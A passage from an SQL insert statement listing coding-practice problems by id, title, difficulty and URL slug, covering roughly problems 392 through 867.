Subsequence','Easy','is-subsequence',1),(393,'UTF-8 Validation','Medium','utf-8-validation',1),(394,'Decode String','Medium','decode-string',1),(395,'Longest Substring with At Least K Repeating Characters','Medium','longest-substring-with-at-least-k-repeating-characters',1),(396,'Rotate Function','Medium','rotate-function',1),(397,'Integer Replacement','Medium','integer-replacement',1),(398,'Random Pick Index','Medium','random-pick-index',1),(399,'Evaluate Division','Medium','evaluate-division',1),(400,'Nth Digit','Medium','nth-digit',1),(401,'Binary Watch','Easy','binary-watch',1),(402,'Remove K Digits','Medium','remove-k-digits',1),(403,'Frog Jump','Hard','frog-jump',1),(404,'Sum of Left Leaves','Easy','sum-of-left-leaves',1),(405,'Convert a Number to Hexadecimal','Easy','convert-a-number-to-hexadecimal',1),(406,'Queue Reconstruction by Height','Medium','queue-reconstruction-by-height',1),(407,'Trapping Rain Water II','Hard','trapping-rain-water-ii',1),(408,'Valid Word Abbreviation','Easy','valid-word-abbreviation',1),(409,'Longest Palindrome','Easy','longest-palindrome',1),(410,'Split Array Largest Sum','Hard','split-array-largest-sum',1),(411,'Minimum Unique Word Abbreviation','Hard','minimum-unique-word-abbreviation',1),(412,'Fizz Buzz','Easy','fizz-buzz',1),(413,'Arithmetic Slices','Medium','arithmetic-slices',1),(414,'Third Maximum Number','Easy','third-maximum-number',1),(415,'Add Strings','Easy','add-strings',1),(416,'Partition Equal Subset Sum','Medium','partition-equal-subset-sum',1),(417,'Pacific Atlantic Water Flow','Medium','pacific-atlantic-water-flow',1),(418,'Sentence Screen Fitting','Medium','sentence-screen-fitting',1),(419,'Battleships in a Board','Medium','battleships-in-a-board',1),(420,'Strong Password Checker','Hard','strong-password-checker',1),(421,'Maximum XOR of Two Numbers in an Array','Medium','maximum-xor-of-two-numbers-in-an-array',1),(422,'Valid Word Square','Easy','valid-word-square',1),(423,'Reconstruct Original Digits from English','Medium','reconstruct-original-digits-from-english',1),(424,'Longest Repeating Character Replacement','Medium','longest-repeating-character-replacement',1),(425,'Word Squares','Hard','word-squares',1),(426,'Convert Binary Search Tree to Sorted Doubly Linked List','Medium','convert-binary-search-tree-to-sorted-doubly-linked-list',1),(427,'Construct Quad Tree','Medium','construct-quad-tree',1),(428,'Serialize and Deserialize N-ary Tree','Hard','serialize-and-deserialize-n-ary-tree',1),(429,'N-ary Tree Level Order Traversal','Medium','n-ary-tree-level-order-traversal',1),(430,'Flatten a Multilevel Doubly Linked List','Medium','flatten-a-multilevel-doubly-linked-list',1),(431,'Encode N-ary Tree to Binary Tree','Hard','encode-n-ary-tree-to-binary-tree',1),(432,'All O`one Data Structure','Hard','all-oone-data-structure',1),(433,'Minimum Genetic Mutation','Medium','minimum-genetic-mutation',1),(434,'Number of Segments in a String','Easy','number-of-segments-in-a-string',1),(435,'Non-overlapping Intervals','Medium','non-overlapping-intervals',1),(436,'Find Right Interval','Medium','find-right-interval',1),(437,'Path Sum III','Medium','path-sum-iii',1),(438,'Find All Anagrams in a String','Medium','find-all-anagrams-in-a-string',1),(439,'Ternary Expression Parser','Medium','ternary-expression-parser',1),(440,'K-th Smallest in Lexicographical Order','Hard','k-th-smallest-in-lexicographical-order',1),(441,'Arranging Coins','Easy','arranging-coins',1),(442,'Find All Duplicates in an Array','Medium','find-all-duplicates-in-an-array',1),(443,'String Compression','Medium','string-compression',1),(444,'Sequence Reconstruction','Medium','sequence-reconstruction',1),(445,'Add Two Numbers II','Medium','add-two-numbers-ii',1),(446,'Arithmetic Slices II - Subsequence','Hard','arithmetic-slices-ii-subsequence',1),(447,'Number of Boomerangs','Medium','number-of-boomerangs',1),(448,'Find All Numbers Disappeared in an Array','Easy','find-all-numbers-disappeared-in-an-array',1),(449,'Serialize and Deserialize BST','Medium','serialize-and-deserialize-bst',1),(450,'Delete Node in a BST','Medium','delete-node-in-a-bst',1),(451,'Sort Characters By Frequency','Medium','sort-characters-by-frequency',1),(452,'Minimum Number of Arrows to Burst Balloons','Medium','minimum-number-of-arrows-to-burst-balloons',1),(453,'Minimum Moves to Equal Array Elements','Medium','minimum-moves-to-equal-array-elements',1),(454,'4Sum II','Medium','4sum-ii',1),(455,'Assign Cookies','Easy','assign-cookies',1),(456,'132 Pattern','Medium','132-pattern',1),(457,'Circular Array Loop','Medium','circular-array-loop',1),(458,'Poor Pigs','Hard','poor-pigs',1),(459,'Repeated Substring Pattern','Easy','repeated-substring-pattern',1),(460,'LFU Cache','Hard','lfu-cache',1),(461,'Hamming Distance','Easy','hamming-distance',1),(462,'Minimum Moves to Equal Array Elements II','Medium','minimum-moves-to-equal-array-elements-ii',1),(463,'Island Perimeter','Easy','island-perimeter',1),(464,'Can I Win','Medium','can-i-win',1),(465,'Optimal Account Balancing','Hard','optimal-account-balancing',1),(466,'Count The Repetitions','Hard','count-the-repetitions',1),(467,'Unique Substrings in Wraparound String','Medium','unique-substrings-in-wraparound-string',1),(468,'Validate IP Address','Medium','validate-ip-address',1),(469,'Convex Polygon','Medium','convex-polygon',1),(470,'Implement Rand10() Using Rand7()','Medium','implement-rand10-using-rand7',1),(471,'Encode String with Shortest Length','Hard','encode-string-with-shortest-length',1),(472,'Concatenated Words','Hard','concatenated-words',1),(473,'Matchsticks to Square','Medium','matchsticks-to-square',1),(474,'Ones and Zeroes','Medium','ones-and-zeroes',1),(475,'Heaters','Medium','heaters',1),(476,'Number Complement','Easy','number-complement',1),(477,'Total Hamming Distance','Medium','total-hamming-distance',1),(478,'Generate Random Point in a Circle','Medium','generate-random-point-in-a-circle',1),(479,'Largest Palindrome Product','Hard','largest-palindrome-product',1),(480,'Sliding Window Median','Hard','sliding-window-median',1),(481,'Magical String','Medium','magical-string',1),(482,'License Key Formatting','Easy','license-key-formatting',1),(483,'Smallest Good Base','Hard','smallest-good-base',1),(484,'Find Permutation','Medium','find-permutation',1),(485,'Max Consecutive Ones','Easy','max-consecutive-ones',1),(486,'Predict the Winner','Medium','predict-the-winner',1),(487,'Max Consecutive Ones II','Medium','max-consecutive-ones-ii',1),(488,'Zuma Game','Hard','zuma-game',1),(489,'Robot Room Cleaner','Hard','robot-room-cleaner',1),(490,'The Maze','Medium','the-maze',1),(491,'Non-decreasing Subsequences','Medium','non-decreasing-subsequences',1),(492,'Construct the Rectangle','Easy','construct-the-rectangle',1),(493,'Reverse Pairs','Hard','reverse-pairs',1),(494,'Target Sum','Medium','target-sum',1),(495,'Teemo Attacking','Easy','teemo-attacking',1),(496,'Next Greater Element I','Easy','next-greater-element-i',1),(497,'Random Point in Non-overlapping Rectangles','Medium','random-point-in-non-overlapping-rectangles',1),(498,'Diagonal Traverse','Medium','diagonal-traverse',1),(499,'The Maze III','Hard','the-maze-iii',1),(500,'Keyboard Row','Easy','keyboard-row',1),(501,'Find Mode in Binary Search Tree','Easy','find-mode-in-binary-search-tree',1),(502,'IPO','Hard','ipo',1),(503,'Next Greater Element II','Medium','next-greater-element-ii',1),(504,'Base 7','Easy','base-7',1),(505,'The Maze II','Medium','the-maze-ii',1),(506,'Relative Ranks','Easy','relative-ranks',1),(507,'Perfect Number','Easy','perfect-number',1),(508,'Most Frequent Subtree Sum','Medium','most-frequent-subtree-sum',1),(509,'Fibonacci Number','Easy','fibonacci-number',1),(510,'Inorder Successor in BST II','Medium','inorder-successor-in-bst-ii',1),(511,'Game Play Analysis I','Easy','game-play-analysis-i',1),(512,'Game Play Analysis II','Easy','game-play-analysis-ii',1),(513,'Find Bottom Left Tree Value','Medium','find-bottom-left-tree-value',1),(514,'Freedom Trail','Hard','freedom-trail',1),(515,'Find Largest Value in Each Tree Row','Medium','find-largest-value-in-each-tree-row',1),(516,'Longest Palindromic Subsequence','Medium','longest-palindromic-subsequence',1),(517,'Super Washing Machines','Hard','super-washing-machines',1),(518,'Coin Change II','Medium','coin-change-ii',1),(519,'Random Flip Matrix','Medium','random-flip-matrix',1),(520,'Detect Capital','Easy','detect-capital',1),(521,'Longest Uncommon Subsequence I','Easy','longest-uncommon-subsequence-i',1),(522,'Longest Uncommon Subsequence II','Medium','longest-uncommon-subsequence-ii',1),(523,'Continuous Subarray Sum','Medium','continuous-subarray-sum',1),(524,'Longest Word in Dictionary through Deleting','Medium','longest-word-in-dictionary-through-deleting',1),(525,'Contiguous Array','Medium','contiguous-array',1),(526,'Beautiful Arrangement','Medium','beautiful-arrangement',1),(527,'Word Abbreviation','Hard','word-abbreviation',1),(528,'Random Pick with Weight','Medium','random-pick-with-weight',1),(529,'Minesweeper','Medium','minesweeper',1),(530,'Minimum Absolute Difference in BST','Easy','minimum-absolute-difference-in-bst',1),(531,'Lonely Pixel I','Medium','lonely-pixel-i',1),(532,'K-diff Pairs in an Array','Medium','k-diff-pairs-in-an-array',1),(533,'Lonely Pixel II','Medium','lonely-pixel-ii',1),(534,'Game Play Analysis III','Medium','game-play-analysis-iii',1),(535,'Encode and Decode TinyURL','Medium','encode-and-decode-tinyurl',1),(536,'Construct Binary Tree from String','Medium','construct-binary-tree-from-string',1),(537,'Complex Number Multiplication','Medium','complex-number-multiplication',1),(538,'Convert BST to Greater Tree','Medium','convert-bst-to-greater-tree',1),(539,'Minimum Time Difference','Medium','minimum-time-difference',1),(540,'Single Element in a Sorted Array','Medium','single-element-in-a-sorted-array',1),(541,'Reverse String II','Easy','reverse-string-ii',1),(542,'01 Matrix','Medium','01-matrix',1),(543,'Diameter of Binary Tree','Easy','diameter-of-binary-tree',1),(544,'Output Contest Matches','Medium','output-contest-matches',1),(545,'Boundary of Binary Tree','Medium','boundary-of-binary-tree',1),(546,'Remove Boxes','Hard','remove-boxes',1),(547,'Number of Provinces','Medium','number-of-provinces',1),(548,'Split Array with Equal Sum','Hard','split-array-with-equal-sum',1),(549,'Binary Tree Longest Consecutive Sequence II','Medium','binary-tree-longest-consecutive-sequence-ii',1),(550,'Game Play Analysis IV','Medium','game-play-analysis-iv',1),(551,'Student Attendance Record I','Easy','student-attendance-record-i',1),(552,'Student Attendance Record II','Hard','student-attendance-record-ii',1),(553,'Optimal Division','Medium','optimal-division',1),(554,'Brick Wall','Medium','brick-wall',1),(555,'Split Concatenated Strings','Medium','split-concatenated-strings',1),(556,'Next Greater Element III','Medium','next-greater-element-iii',1),(557,'Reverse Words in a String III','Easy','reverse-words-in-a-string-iii',1),(558,'Logical OR of Two Binary Grids Represented as Quad-Trees','Medium','logical-or-of-two-binary-grids-represented-as-quad-trees',1),(559,'Maximum Depth of N-ary Tree','Easy','maximum-depth-of-n-ary-tree',1),(560,'Subarray Sum Equals K','Medium','subarray-sum-equals-k',1),(561,'Array Partition','Easy','array-partition',1),(562,'Longest Line of Consecutive One in Matrix','Medium','longest-line-of-consecutive-one-in-matrix',1),(563,'Binary Tree Tilt','Easy','binary-tree-tilt',1),(564,'Find the Closest Palindrome','Hard','find-the-closest-palindrome',1),(565,'Array Nesting','Medium','array-nesting',1),(566,'Reshape the Matrix','Easy','reshape-the-matrix',1),(567,'Permutation in String','Medium','permutation-in-string',1),(568,'Maximum Vacation Days','Hard','maximum-vacation-days',1),(569,'Median Employee Salary','Hard','median-employee-salary',1),(570,'Managers with at Least 5 Direct Reports','Medium','managers-with-at-least-5-direct-reports',1),(571,'Find Median Given Frequency of Numbers','Hard','find-median-given-frequency-of-numbers',1),(572,'Subtree of Another Tree','Easy','subtree-of-another-tree',1),(573,'Squirrel Simulation','Medium','squirrel-simulation',1),(574,'Winning Candidate','Medium','winning-candidate',1),(575,'Distribute Candies','Easy','distribute-candies',1),(576,'Out of Boundary Paths','Medium','out-of-boundary-paths',1),(577,'Employee Bonus','Easy','employee-bonus',1),(578,'Get Highest Answer Rate Question','Medium','get-highest-answer-rate-question',1),(579,'Find Cumulative Salary of an Employee','Hard','find-cumulative-salary-of-an-employee',1),(580,'Count Student Number in Departments','Medium','count-student-number-in-departments',1),(581,'Shortest Unsorted Continuous Subarray','Medium','shortest-unsorted-continuous-subarray',1),(582,'Kill Process','Medium','kill-process',1),(583,'Delete Operation for Two Strings','Medium','delete-operation-for-two-strings',1),(584,'Find Customer Referee','Easy','find-customer-referee',1),(585,'Investments in 2016','Medium','investments-in-2016',1),(586,'Customer Placing the Largest Number of Orders','Easy','customer-placing-the-largest-number-of-orders',1),(587,'Erect the Fence','Hard','erect-the-fence',1),(588,'Design In-Memory File System','Hard','design-in-memory-file-system',1),(589,'N-ary Tree Preorder Traversal','Easy','n-ary-tree-preorder-traversal',1),(590,'N-ary Tree Postorder Traversal','Easy','n-ary-tree-postorder-traversal',1),(591,'Tag Validator','Hard','tag-validator',1),(592,'Fraction Addition and Subtraction','Medium','fraction-addition-and-subtraction',1),(593,'Valid Square','Medium','valid-square',1),(594,'Longest Harmonious Subsequence','Easy','longest-harmonious-subsequence',1),(595,'Big Countries','Easy','big-countries',1),(596,'Classes More Than 5 Students','Easy','classes-more-than-5-students',1),(597,'Friend Requests I: Overall Acceptance Rate','Easy','friend-requests-i-overall-acceptance-rate',1),(598,'Range Addition II','Easy','range-addition-ii',1),(599,'Minimum Index Sum of Two Lists','Easy','minimum-index-sum-of-two-lists',1),(600,'Non-negative Integers without Consecutive Ones','Hard','non-negative-integers-without-consecutive-ones',1),(601,'Human Traffic of Stadium','Hard','human-traffic-of-stadium',1),(602,'Friend Requests II: Who Has the Most Friends','Medium','friend-requests-ii-who-has-the-most-friends',1),(603,'Consecutive Available Seats','Easy','consecutive-available-seats',1),(604,'Design Compressed String Iterator','Easy','design-compressed-string-iterator',1),(605,'Can Place Flowers','Easy','can-place-flowers',1),(606,'Construct String from Binary Tree','Easy','construct-string-from-binary-tree',1),(607,'Sales Person','Easy','sales-person',1),(608,'Tree Node','Medium','tree-node',1),(609,'Find Duplicate File in System','Medium','find-duplicate-file-in-system',1),(610,'Triangle Judgement','Easy','triangle-judgement',1),(611,'Valid Triangle Number','Medium','valid-triangle-number',1),(612,'Shortest Distance in a Plane','Medium','shortest-distance-in-a-plane',1),(613,'Shortest Distance in a Line','Easy','shortest-distance-in-a-line',1),(614,'Second Degree Follower','Medium','second-degree-follower',1),(615,'Average Salary: Departments VS Company','Hard','average-salary-departments-vs-company',1),(616,'Add Bold Tag in String','Medium','add-bold-tag-in-string',1),(617,'Merge Two Binary Trees','Easy','merge-two-binary-trees',1),(618,'Students Report By Geography','Hard','students-report-by-geography',1),(619,'Biggest Single Number','Easy','biggest-single-number',1),(620,'Not Boring Movies','Easy','not-boring-movies',1),(621,'Task Scheduler','Medium','task-scheduler',1),(622,'Design Circular Queue','Medium','design-circular-queue',1),(623,'Add One Row to Tree','Medium','add-one-row-to-tree',1),(624,'Maximum Distance in Arrays','Medium','maximum-distance-in-arrays',1),(625,'Minimum Factorization','Medium','minimum-factorization',1),(626,'Exchange Seats','Medium','exchange-seats',1),(627,'Swap Salary','Easy','swap-salary',1),(628,'Maximum Product of Three Numbers','Easy','maximum-product-of-three-numbers',1),(629,'K Inverse Pairs Array','Hard','k-inverse-pairs-array',1),(630,'Course Schedule III','Hard','course-schedule-iii',1),(631,'Design Excel Sum Formula','Hard','design-excel-sum-formula',1),(632,'Smallest Range Covering Elements from K Lists','Hard','smallest-range-covering-elements-from-k-lists',1),(633,'Sum of Square Numbers','Medium','sum-of-square-numbers',1),(634,'Find the Derangement of An Array','Medium','find-the-derangement-of-an-array',1),(635,'Design Log Storage System','Medium','design-log-storage-system',1),(636,'Exclusive Time of Functions','Medium','exclusive-time-of-functions',1),(637,'Average of Levels in Binary Tree','Easy','average-of-levels-in-binary-tree',1),(638,'Shopping Offers','Medium','shopping-offers',1),(639,'Decode Ways II','Hard','decode-ways-ii',1),(640,'Solve the Equation','Medium','solve-the-equation',1),(641,'Design Circular Deque','Medium','design-circular-deque',1),(642,'Design Search Autocomplete System','Hard','design-search-autocomplete-system',1),(643,'Maximum Average Subarray I','Easy','maximum-average-subarray-i',1),(644,'Maximum Average Subarray II','Hard','maximum-average-subarray-ii',1),(645,'Set Mismatch','Easy','set-mismatch',1),(646,'Maximum Length of Pair Chain','Medium','maximum-length-of-pair-chain',1),(647,'Palindromic Substrings','Medium','palindromic-substrings',1),(648,'Replace Words','Medium','replace-words',1),(649,'Dota2 Senate','Medium','dota2-senate',1),(650,'2 Keys Keyboard','Medium','2-keys-keyboard',1),(651,'4 Keys Keyboard','Medium','4-keys-keyboard',1),(652,'Find Duplicate Subtrees','Medium','find-duplicate-subtrees',1),(653,'Two Sum IV - Input is a BST','Easy','two-sum-iv-input-is-a-bst',1),(654,'Maximum Binary Tree','Medium','maximum-binary-tree',1),(655,'Print Binary Tree','Medium','print-binary-tree',1),(656,'Coin Path','Hard','coin-path',1),(657,'Robot Return to Origin','Easy','robot-return-to-origin',1),(658,'Find K Closest Elements','Medium','find-k-closest-elements',1),(659,'Split Array into Consecutive Subsequences','Medium','split-array-into-consecutive-subsequences',1),(660,'Remove 9','Hard','remove-9',1),(661,'Image Smoother','Easy','image-smoother',1),(662,'Maximum Width of Binary Tree','Medium','maximum-width-of-binary-tree',1),(663,'Equal Tree Partition','Medium','equal-tree-partition',1),(664,'Strange Printer','Hard','strange-printer',1),(665,'Non-decreasing Array','Medium','non-decreasing-array',1),(666,'Path Sum IV','Medium','path-sum-iv',1),(667,'Beautiful Arrangement II','Medium','beautiful-arrangement-ii',1),(668,'Kth Smallest Number in Multiplication Table','Hard','kth-smallest-number-in-multiplication-table',1),(669,'Trim a Binary Search Tree','Medium','trim-a-binary-search-tree',1),(670,'Maximum Swap','Medium','maximum-swap',1),(671,'Second Minimum Node In a Binary Tree','Easy','second-minimum-node-in-a-binary-tree',1),(672,'Bulb Switcher II','Medium','bulb-switcher-ii',1),(673,'Number of Longest Increasing Subsequence','Medium','number-of-longest-increasing-subsequence',1),(674,'Longest Continuous Increasing Subsequence','Easy','longest-continuous-increasing-subsequence',1),(675,'Cut Off Trees for Golf Event','Hard','cut-off-trees-for-golf-event',1),(676,'Implement Magic Dictionary','Medium','implement-magic-dictionary',1),(677,'Map Sum Pairs','Medium','map-sum-pairs',1),(678,'Valid Parenthesis String','Medium','valid-parenthesis-string',1),(679,'24 Game','Hard','24-game',1),(680,'Valid Palindrome II','Easy','valid-palindrome-ii',1),(681,'Next Closest Time','Medium','next-closest-time',1),(682,'Baseball Game','Easy','baseball-game',1),(683,'K Empty Slots','Hard','k-empty-slots',1),(684,'Redundant Connection','Medium','redundant-connection',1),(685,'Redundant Connection II','Hard','redundant-connection-ii',1),(686,'Repeated String Match','Medium','repeated-string-match',1),(687,'Longest Univalue Path','Medium','longest-univalue-path',1),(688,'Knight Probability in Chessboard','Medium','knight-probability-in-chessboard',1),(689,'Maximum Sum of 3 Non-Overlapping Subarrays','Hard','maximum-sum-of-3-non-overlapping-subarrays',1),(690,'Employee Importance','Medium','employee-importance',1),(691,'Stickers to Spell Word','Hard','stickers-to-spell-word',1),(692,'Top K Frequent Words','Medium','top-k-frequent-words',1),(693,'Binary Number with Alternating Bits','Easy','binary-number-with-alternating-bits',1),(694,'Number of Distinct Islands','Medium','number-of-distinct-islands',1),(695,'Max Area of Island','Medium','max-area-of-island',1),(696,'Count Binary Substrings','Easy','count-binary-substrings',1),(697,'Degree of an Array','Easy','degree-of-an-array',1),(698,'Partition to K Equal Sum Subsets','Medium','partition-to-k-equal-sum-subsets',1),(699,'Falling Squares','Hard','falling-squares',1),(700,'Search in a Binary Search Tree','Easy','search-in-a-binary-search-tree',1),(701,'Insert into a Binary Search Tree','Medium','insert-into-a-binary-search-tree',1),(702,'Search in a Sorted Array of Unknown Size','Medium','search-in-a-sorted-array-of-unknown-size',1),(703,'Kth Largest Element in a Stream','Easy','kth-largest-element-in-a-stream',1),(704,'Binary Search','Easy','binary-search',1),(705,'Design HashSet','Easy','design-hashset',1),(706,'Design HashMap','Easy','design-hashmap',1),(707,'Design Linked List','Medium','design-linked-list',1),(708,'Insert into a Sorted Circular Linked List','Medium','insert-into-a-sorted-circular-linked-list',1),(709,'To Lower Case','Easy','to-lower-case',1),(710,'Random Pick with Blacklist','Hard','random-pick-with-blacklist',1),(711,'Number of Distinct Islands II','Hard','number-of-distinct-islands-ii',1),(712,'Minimum ASCII Delete Sum for Two Strings','Medium','minimum-ascii-delete-sum-for-two-strings',1),(713,'Subarray Product Less Than K','Medium','subarray-product-less-than-k',1),(714,'Best Time to Buy and Sell Stock with Transaction Fee','Medium','best-time-to-buy-and-sell-stock-with-transaction-fee',1),(715,'Range Module','Hard','range-module',1),(716,'Max Stack','Hard','max-stack',1),(717,'1-bit and 2-bit Characters','Easy','1-bit-and-2-bit-characters',1),(718,'Maximum Length of Repeated Subarray','Medium','maximum-length-of-repeated-subarray',1),(719,'Find K-th Smallest Pair Distance','Hard','find-k-th-smallest-pair-distance',1),(720,'Longest Word in Dictionary','Medium','longest-word-in-dictionary',1),(721,'Accounts Merge','Medium','accounts-merge',1),(722,'Remove Comments','Medium','remove-comments',1),(723,'Candy Crush','Medium','candy-crush',1),(724,'Find Pivot Index','Easy','find-pivot-index',1),(725,'Split Linked List in Parts','Medium','split-linked-list-in-parts',1),(726,'Number of Atoms','Hard','number-of-atoms',1),(727,'Minimum Window Subsequence','Hard','minimum-window-subsequence',1),(728,'Self Dividing Numbers','Easy','self-dividing-numbers',1),(729,'My Calendar I','Medium','my-calendar-i',1),(730,'Count Different Palindromic Subsequences','Hard','count-different-palindromic-subsequences',1),(731,'My Calendar II','Medium','my-calendar-ii',1),(732,'My Calendar III','Hard','my-calendar-iii',1),(733,'Flood Fill','Easy','flood-fill',1),(734,'Sentence Similarity','Easy','sentence-similarity',1),(735,'Asteroid Collision','Medium','asteroid-collision',1),(736,'Parse Lisp Expression','Hard','parse-lisp-expression',1),(737,'Sentence Similarity II','Medium','sentence-similarity-ii',1),(738,'Monotone Increasing Digits','Medium','monotone-increasing-digits',1),(739,'Daily Temperatures','Medium','daily-temperatures',1),(740,'Delete and Earn','Medium','delete-and-earn',1),(741,'Cherry Pickup','Hard','cherry-pickup',1),(742,'Closest Leaf in a Binary Tree','Medium','closest-leaf-in-a-binary-tree',1),(743,'Network Delay Time','Medium','network-delay-time',1),(744,'Find Smallest Letter Greater Than Target','Easy','find-smallest-letter-greater-than-target',1),(745,'Prefix and Suffix Search','Hard','prefix-and-suffix-search',1),(746,'Min Cost Climbing Stairs','Easy','min-cost-climbing-stairs',1),(747,'Largest Number At Least Twice of Others','Easy','largest-number-at-least-twice-of-others',1),(748,'Shortest Completing Word','Easy','shortest-completing-word',1),(749,'Contain Virus','Hard','contain-virus',1),(750,'Number Of Corner Rectangles','Medium','number-of-corner-rectangles',1),(751,'IP to CIDR','Medium','ip-to-cidr',1),(752,'Open the Lock','Medium','open-the-lock',1),(753,'Cracking the Safe','Hard','cracking-the-safe',1),(754,'Reach a Number','Medium','reach-a-number',1),(755,'Pour Water','Medium','pour-water',1),(756,'Pyramid Transition Matrix','Medium','pyramid-transition-matrix',1),(757,'Set Intersection Size At Least Two','Hard','set-intersection-size-at-least-two',1),(758,'Bold Words in String','Medium','bold-words-in-string',1),(759,'Employee Free Time','Hard','employee-free-time',1),(760,'Find Anagram Mappings','Easy','find-anagram-mappings',1),(761,'Special Binary String','Hard','special-binary-string',1),(762,'Prime Number of Set Bits in Binary Representation','Easy','prime-number-of-set-bits-in-binary-representation',1),(763,'Partition Labels','Medium','partition-labels',1),(764,'Largest Plus Sign','Medium','largest-plus-sign',1),(765,'Couples Holding Hands','Hard','couples-holding-hands',1),(766,'Toeplitz Matrix','Easy','toeplitz-matrix',1),(767,'Reorganize String','Medium','reorganize-string',1),(768,'Max Chunks To Make Sorted II','Hard','max-chunks-to-make-sorted-ii',1),(769,'Max Chunks To Make Sorted','Medium','max-chunks-to-make-sorted',1),(770,'Basic Calculator IV','Hard','basic-calculator-iv',1),(771,'Jewels and Stones','Easy','jewels-and-stones',1),(772,'Basic Calculator III','Hard','basic-calculator-iii',1),(773,'Sliding Puzzle','Hard','sliding-puzzle',1),(774,'Minimize Max Distance to Gas Station','Hard','minimize-max-distance-to-gas-station',1),(775,'Global and Local Inversions','Medium','global-and-local-inversions',1),(776,'Split BST','Medium','split-bst',1),(777,'Swap Adjacent in LR String','Medium','swap-adjacent-in-lr-string',1),(778,'Swim in Rising Water','Hard','swim-in-rising-water',1),(779,'K-th Symbol in Grammar','Medium','k-th-symbol-in-grammar',1),(780,'Reaching Points','Hard','reaching-points',1),(781,'Rabbits in Forest','Medium','rabbits-in-forest',1),(782,'Transform to Chessboard','Hard','transform-to-chessboard',1),(783,'Minimum Distance Between BST Nodes','Easy','minimum-distance-between-bst-nodes',1),(784,'Letter Case Permutation','Medium','letter-case-permutation',1),(785,'Is Graph Bipartite?','Medium','is-graph-bipartite',1),(786,'K-th Smallest Prime Fraction','Medium','k-th-smallest-prime-fraction',1),(787,'Cheapest Flights Within K Stops','Medium','cheapest-flights-within-k-stops',1),(788,'Rotated Digits','Medium','rotated-digits',1),(789,'Escape The Ghosts','Medium','escape-the-ghosts',1),(790,'Domino and Tromino Tiling','Medium','domino-and-tromino-tiling',1),(791,'Custom Sort String','Medium','custom-sort-string',1),(792,'Number of Matching Subsequences','Medium','number-of-matching-subsequences',1),(793,'Preimage Size of Factorial Zeroes Function','Hard','preimage-size-of-factorial-zeroes-function',1),(794,'Valid Tic-Tac-Toe State','Medium','valid-tic-tac-toe-state',1),(795,'Number of Subarrays with Bounded Maximum','Medium','number-of-subarrays-with-bounded-maximum',1),(796,'Rotate String','Easy','rotate-string',1),(797,'All Paths From Source to Target','Medium','all-paths-from-source-to-target',1),(798,'Smallest Rotation with Highest Score','Hard','smallest-rotation-with-highest-score',1),(799,'Champagne Tower','Medium','champagne-tower',1),(800,'Similar RGB Color','Easy','similar-rgb-color',1),(801,'Minimum Swaps To Make Sequences Increasing','Hard','minimum-swaps-to-make-sequences-increasing',1),(802,'Find Eventual Safe States','Medium','find-eventual-safe-states',1),(803,'Bricks Falling When Hit','Hard','bricks-falling-when-hit',1),(804,'Unique Morse Code Words','Easy','unique-morse-code-words',1),(805,'Split Array With Same Average','Hard','split-array-with-same-average',1),(806,'Number of Lines To Write String','Easy','number-of-lines-to-write-string',1),(807,'Max Increase to Keep City Skyline','Medium','max-increase-to-keep-city-skyline',1),(808,'Soup Servings','Medium','soup-servings',1),(809,'Expressive Words','Medium','expressive-words',1),(810,'Chalkboard XOR Game','Hard','chalkboard-xor-game',1),(811,'Subdomain Visit Count','Medium','subdomain-visit-count',1),(812,'Largest Triangle Area','Easy','largest-triangle-area',1),(813,'Largest Sum of Averages','Medium','largest-sum-of-averages',1),(814,'Binary Tree Pruning','Medium','binary-tree-pruning',1),(815,'Bus Routes','Hard','bus-routes',1),(816,'Ambiguous Coordinates','Medium','ambiguous-coordinates',1),(817,'Linked List Components','Medium','linked-list-components',1),(818,'Race Car','Hard','race-car',1),(819,'Most Common Word','Easy','most-common-word',1),(820,'Short Encoding of Words','Medium','short-encoding-of-words',1),(821,'Shortest Distance to a Character','Easy','shortest-distance-to-a-character',1),(822,'Card Flipping Game','Medium','card-flipping-game',1),(823,'Binary Trees With Factors','Medium','binary-trees-with-factors',1),(824,'Goat Latin','Easy','goat-latin',1),(825,'Friends Of Appropriate Ages','Medium','friends-of-appropriate-ages',1),(826,'Most Profit Assigning Work','Medium','most-profit-assigning-work',1),(827,'Making A Large Island','Hard','making-a-large-island',1),(828,'Count Unique Characters of All Substrings of a Given String','Hard','count-unique-characters-of-all-substrings-of-a-given-string',1),(829,'Consecutive Numbers Sum','Hard','consecutive-numbers-sum',1),(830,'Positions of Large Groups','Easy','positions-of-large-groups',1),(831,'Masking Personal Information','Medium','masking-personal-information',1),(832,'Flipping an Image','Easy','flipping-an-image',1),(833,'Find And Replace in String','Medium','find-and-replace-in-string',1),(834,'Sum of Distances in Tree','Hard','sum-of-distances-in-tree',1),(835,'Image Overlap','Medium','image-overlap',1),(836,'Rectangle Overlap','Easy','rectangle-overlap',1),(837,'New 21 Game','Medium','new-21-game',1),(838,'Push Dominoes','Medium','push-dominoes',1),(839,'Similar String Groups','Hard','similar-string-groups',1),(840,'Magic Squares In Grid','Medium','magic-squares-in-grid',1),(841,'Keys and Rooms','Medium','keys-and-rooms',1),(842,'Split Array into Fibonacci Sequence','Medium','split-array-into-fibonacci-sequence',1),(843,'Guess the Word','Hard','guess-the-word',1),(844,'Backspace String Compare','Easy','backspace-string-compare',1),(845,'Longest Mountain in Array','Medium','longest-mountain-in-array',1),(846,'Hand of Straights','Medium','hand-of-straights',1),(847,'Shortest Path Visiting All Nodes','Hard','shortest-path-visiting-all-nodes',1),(848,'Shifting Letters','Medium','shifting-letters',1),(849,'Maximize Distance to Closest Person','Medium','maximize-distance-to-closest-person',1),(850,'Rectangle Area II','Hard','rectangle-area-ii',1),(851,'Loud and Rich','Medium','loud-and-rich',1),(852,'Peak Index in a Mountain Array','Medium','peak-index-in-a-mountain-array',1),(853,'Car Fleet','Medium','car-fleet',1),(854,'K-Similar Strings','Hard','k-similar-strings',1),(855,'Exam Room','Medium','exam-room',1),(856,'Score of Parentheses','Medium','score-of-parentheses',1),(857,'Minimum Cost to Hire K Workers','Hard','minimum-cost-to-hire-k-workers',1),(858,'Mirror Reflection','Medium','mirror-reflection',1),(859,'Buddy Strings','Easy','buddy-strings',1),(860,'Lemonade Change','Easy','lemonade-change',1),(861,'Score After Flipping Matrix','Medium','score-after-flipping-matrix',1),(862,'Shortest Subarray with Sum at Least K','Hard','shortest-subarray-with-sum-at-least-k',1),(863,'All Nodes Distance K in Binary Tree','Medium','all-nodes-distance-k-in-binary-tree',1),(864,'Shortest Path to Get All Keys','Hard','shortest-path-to-get-all-keys',1),(865,'Smallest Subtree with all the Deepest Nodes','Medium','smallest-subtree-with-all-the-deepest-nodes',1),(866,'Prime Palindrome','Medium','prime-palindrome',1),(867,'Transpose 